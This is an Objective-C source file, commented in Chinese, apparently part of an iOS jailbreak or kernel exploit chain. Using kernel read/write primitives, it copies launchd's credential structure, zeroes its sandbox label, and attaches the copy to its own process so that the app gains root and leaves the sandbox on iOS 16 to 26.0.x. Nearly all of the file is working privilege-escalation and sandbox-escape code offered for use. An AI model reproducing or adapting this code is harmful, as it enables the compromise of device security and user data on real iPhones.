//
//  OWEscalate.m
//  见 OWEscalate.h
//

#import "OWEscalate.h"
#import "OWPrimitives.h"
#import "darksword.h"      // ds_kread64 / ds_kwrite64 / ds_kwrite32 的原型
#import "offsets.h"
#import "utils.h"

#include <unistd.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

// ---------------------------------------------------------------------------
// 偏移表：lara 的 init_offsets()（utils.m）只填 PROC_PID / TASK_TNEXT / THREAD_MUPCB
// 三个值，proc/ucred 那一整套在 offsets_init()（offsets.m）里。
// 上游把这两步拆开且没有串联，直接调 init_offsets() 会让
// off_proc_p_proc_ro / off_proc_ro_p_ucred / off_ucred_cr_label 恒为 0，
// 提权必然卡在 -2。这里负责把两步接上，并把"版本越界"变成可返回的错误。
// ---------------------------------------------------------------------------

#define OW_UCRED_SIZE      0x100   // struct ucred 在 16–26 上的实际占用上限

static char gLastError[256];
static bool gDone = false;
static int  gPrepareResult = -100;   // -100 = 尚未尝试

const char *ow_escalate_last_error(void) { return gLastError; }

static void ow_fail(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vsnprintf(gLastError, sizeof(gLastError), fmt, ap);
    va_end(ap);
}

int ow_prepare_offsets(void) {
    if (gPrepareResult != -100) return gPrepareResult;

    // 第一步：版本相关的少量偏移（不需要 kernelcache）
    init_offsets();

    // 第二步：proc / ucred / thread / task 大表。版本越界时上游会 exit，
    // 我们改成了置位返回，这里据此判定。
    offsets_init();
    if (gOWOffsetsUnsupported) {
        ow_fail("iOS 版本不在偏移表覆盖范围（16.0 – 26.0.x）；"
                "26.1+ 请在 Info.plist 配 OWOffsetsOverride（proc_p_proc_ro / proc_ro_p_ucred）");
        gPrepareResult = -3;
        return gPrepareResult;
    }

    if (!off_proc_p_proc_ro || !off_proc_ro_p_ucred) {
        ow_fail("proc/ucred 偏移未解析 (p_proc_ro=%u, ro_p_ucred=%u)",
                off_proc_p_proc_ro, off_proc_ro_p_ucred);
        gPrepareResult = -2;
        return gPrepareResult;
    }

    gPrepareResult = 0;
    return 0;
}

bool ow_is_root(void)        { return getuid() == 0; }
bool ow_is_unsandboxed(void) {
    // 沙箱存在的直接证据：能写 /var/mobile 之外、或 NSHomeDirectory 可读到 /var/mobile
    // 这里用一个轻量判定：尝试列出 /var/mobile/Library 目录
    return access("/var/mobile/Library", R_OK) == 0;
}

int ow_escalate(void) {
    if (gDone) return 0;

    if (!ow_primitives_available()) {
        ow_fail("无内核读写，无法提权");
        return -1;
    }

    int prep = ow_prepare_offsets();
    if (prep != 0) return prep;

    uint64_t our = ourproc();
    if (!our) { ow_fail("ourproc 失败（kernproc/allproc 链未通）"); return -3; }

    uint64_t launchd = procbypid(1);
    if (!launchd) { ow_fail("找不到 launchd (pid 1)"); return -4; }

    uint64_t our_ro = ds_kread64(our + off_proc_p_proc_ro);
    uint64_t ld_ro  = ds_kread64(launchd + off_proc_p_proc_ro);
    if (!our_ro || !ld_ro) { ow_fail("proc_ro 读取失败"); return -5; }

    uint64_t ld_ucred = ds_kread64(ld_ro + off_proc_ro_p_ucred);
    if (!ld_ucred) { ow_fail("launchd ucred 读取失败"); return -6; }

    uint64_t new_ucred = 0;
    uint8_t  buf[OW_UCRED_SIZE];
    memset(buf, 0, sizeof(buf));

    // 首选：复制一份 launchd 的 ucred，改成无沙箱后挂给自己。
    // 直接改 launchd 的 ucred 会波及所有共享它的进程，所以必须复制。
    if (ow_kalloc_global(&new_ucred, OW_UCRED_SIZE) == 0 && new_ucred) {
        if (ow_kreadbuf(ld_ucred, buf, OW_UCRED_SIZE) != 0) {
            ow_fail("ucred 复制读取失败");
            return -7;
        }
        if (off_ucred_cr_label && off_ucred_cr_label < OW_UCRED_SIZE) {
            // cr_label = 0 → 该 ucred 不再绑定任何沙箱 profile
            memset(buf + off_ucred_cr_label, 0, 8);
        } else {
            ow_fail("cr_label 偏移缺失（%u），只能提权不能脱沙箱", off_ucred_cr_label);
        }
        if (ow_kwritebuf(new_ucred, buf, OW_UCRED_SIZE) != 0) {
            ow_fail("ucred 写回失败");
            return -8;
        }
        ds_kwrite64(our_ro + off_proc_ro_p_ucred, new_ucred);
    } else {
        // 退化：直接借用 launchd 的 ucred。root 拿到了，沙箱可能还在。
        ow_fail("kalloc 不可用，已退化为借用 launchd ucred（可能仍有沙箱）");
        ds_kwrite64(our_ro + off_proc_ro_p_ucred, ld_ucred);
    }

    // 不再往 proc + 0x30 写 0 当 p_uid/p_gid：
    // iOS 16 起 struct proc 该偏移已不是 uid 字段（uid/gid 只在 ucred 里，
    // 且 p_uid/p_gid 已被移除），写 0 会破坏无关指针并触发 panic。
    // 换掉 proc_ro->p_ucred 之后内核判定身份只看 ucred，已足够。

    // 让内核重新评估凭证
    setuid(0);
    setgid(0);

    if (getuid() != 0) {
        // 未成功也要保留原错误信息
        if (!gLastError[0]) ow_fail("提权后 getuid() 仍为 %d", getuid());
        return -9;
    }

    gDone = true;
    return 0;
}
